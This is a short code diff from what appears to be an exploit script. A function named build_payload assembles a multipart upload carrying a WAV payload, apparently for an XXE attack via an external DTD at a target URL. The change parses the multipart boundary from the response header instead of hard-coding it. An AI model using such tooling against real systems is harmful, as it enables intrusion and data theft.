@@ -134,10 +134,11 @@ def build_payload(session, target_url, dtd_url, dtd_filename, **kwargs) -> (str,
     except:
       ...
   logging.debug(f'{headers=}')
+  boundary_header = headers['Content-Type'].split('; ')[1]
+  boundary = boundary_header.split('=')[1].encode()
   # load data in session
   data = open('request.data', 'rb').read()
   data = data + wav_payload.getvalue()
-  boundary = b'---------------------------214067375214075720372354475995'
   end_boundary = b'--' + boundary + b'--\r\n'
   data = data + b'\r\n' + end_boundary
 
